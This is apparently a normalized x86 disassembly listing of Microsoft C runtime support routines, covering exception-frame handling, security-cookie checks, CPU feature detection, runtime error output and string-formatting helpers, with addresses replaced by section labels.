lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_411583
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411707
pop ebx
leave
retn
sub_41151e
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_411450
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_417a60
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_411583
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_411481
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_41686e
mov eax [ eax + 0x80 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x8 ]
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
sub_411658
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
mov ecx [ eax + 0x10 ]
push esi
mov esi [ eax + 0xc ]
push edi
mov [ ebp - 0x8 ] ecx
mov edi esi
mov [ ebp - 0x4 ] esi
test ebx ebx
js r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
cmp edi [ eax + 0xc ]
ja r-xdata
mov edx [ ebp + 0x10 ]
call sub_4170d0
cmp esi edi
jbe r-xdata
dec esi
mov eax esi
imul eax eax 0x14
cmp [ eax + ecx + 0x4 ] edx
jge r-xdata
call sub_4170d0
imul esi esi 0x14
pop edi
lea eax [ ecx + esi ]
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp edx [ eax + ecx + 0x8 ]
jle r-xdata
test ebx ebx
jns r-xdata
mov edi [ ebp - 0x4 ]
dec ebx
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
sub_4116d7
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_411707
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_41175a
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_41686e
mov ecx [ eax + 0x98 ]
mov [ esi + 0x4 ] ecx
call sub_41686e
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_411784
push ebp
mov ebp esp
push esi
call sub_41686e
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_41686e
mov ecx [ eax + 0x98 ]
jmp r-xdata
call sub_41686e
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebp
jmp sub_4170d0
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
pop esi
pop ebp
retn
sub_4117d4
push ebp
mov ebp esp
call sub_41686e
mov eax [ eax + 0x98 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_4117fd
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4186f2
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_411833
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn
xor ecx ecx
mov eax ebx
mov [ rw-data ] ebx
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x10 ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
test [ ebp - 0x8 ] 0x100000
mov [ rw-data ] esi
je r-xdata
test [ ebp - 0x8 ] 0x10000000
je r-xdata
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
push 0x7
xor ecx ecx
pop eax
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
test [ ebp - 0xc ] 0x200
mov esi [ rw-data ]
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
xor eax eax
xor ecx ecx
cpuid
lea edi [ ebp - 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
cmp [ ebp - 0xc ] 0x756e6547
jne r-xdata
or esi 0x2
mov [ rw-data ] esi
pop edi
pop esi
cmp [ ebp - 0x4 ] 0x49656e69
jne r-xdata
cmp [ ebp - 0x8 ] 0x6c65746e
jne r-xdata
xor eax eax
inc eax
xor ecx ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x10 ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
or esi 0x1
mov [ rw-data ] esi
cmp eax 0x20660
je r-xdata
cmp eax 0x20670
je r-xdata
cmp eax 0x30650
je r-xdata
cmp eax 0x30660
je r-xdata
cmp eax 0x30670
jne r-xdata
sub_411970
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_4119fc
push 0xc
push r--data
call sub_411bb0
push 0xe
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411a64
call sub_411bf5
retn
mov ecx [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_40f402
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ ecx ] eax
jne r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
push ecx
call sub_40f402
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
sub_411a6d
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_411aa0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
pop ebp
retn
sub_411ad1
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4188d9
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_411b1b
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_40f43a
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_411b64
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
mov esi eax
cmp eax [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41882e
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_411bb0
push sub_411c10
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_411c10
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x8 ]
xor edi [ rw-data ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
lea esi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40eb9e
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40eb9e
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_413a7b
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
mov ebx [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
add ecx esi
xor ecx [ edx + esi ]
call sub_40eb9e
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40eb9e
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_413a32
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_413a62
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_413a7b
mov eax [ ebp + 0xc ]
push r--data
call sub_416fc0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40eb9e
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_413a49
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ r--data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40eb9e
sub_411da5
push 0x3
call sub_4178de
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_411e02
push 0xff
call sub_411e02
pop ecx
pop ecx
push 0x3
call sub_4178de
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_411dde
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_411e02
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_411dde
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40eb9e
leave
retn
push ebx
push 0x3
call sub_4178de
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_4178de
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_40f538
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_411260
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_412234
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_418953
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_40f538
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_40f4cc
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_418953
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub esi eax
push esi
push ecx
call sub_40ff6d
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_40f4cc
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_41896c
add esp 0xc
jmp r-xdata
sub_411fdc
call sub_41716d
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_417196
pop ecx
push 0x3
call sub_41088c
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_4120c9
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_41203f
push ebp
mov ebp esp
push esi
call sub_41202c
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_412073
pop ecx
mov esi eax
call sub_412060
mov [ eax ] esi
pop esi
pop ebp
retn
sub_412073
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_4120c9
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_414c70
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_415bcb
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_415884
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40eb9e
leave
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_415884
pop ecx
sub_4121f9
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412234
int3
pop ebp
jmp eax
sub_412234
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_4120c9
push esi
call sub_415bb6
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_41225f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_413a92
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_412060
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_412060
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_4134a1
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
xor eax eax
inc eax
push eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call sub_414d00
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
dec eax
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_418c80
pop ecx
test eax eax
jne r-xdata
call sub_4134a1
add eax 0x40
cmp esi eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ ebp + 0x8 ]
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_414d00
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_418cd4
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov ecx [ esi + 0x8 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_413c4d
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_4123ac
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x14 ] eax
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
jmp r-xdata
pop ebx
test ebx ebx
js r-xdata
push ebx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov ebx eax
test esi esi
je r-xdata
pop esi
xor eax eax
cmp [ ebp - 0x1c ] eax
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_41225f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_41225f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_4124a5
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
pop ebp
retn
call sub_412060
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_418d1a
call sub_4123ac
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_412060
mov [ eax ] 0x22
jmp r-xdata
call sub_412224
or eax 0xffffffff
sub_41251c
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x450 ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x430 ] eax
call sub_410368
call sub_412060
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
cmp [ ebp - 0x444 ] bl
je r-xdata
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x448 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
mov ecx [ ebp - 0x448 ]
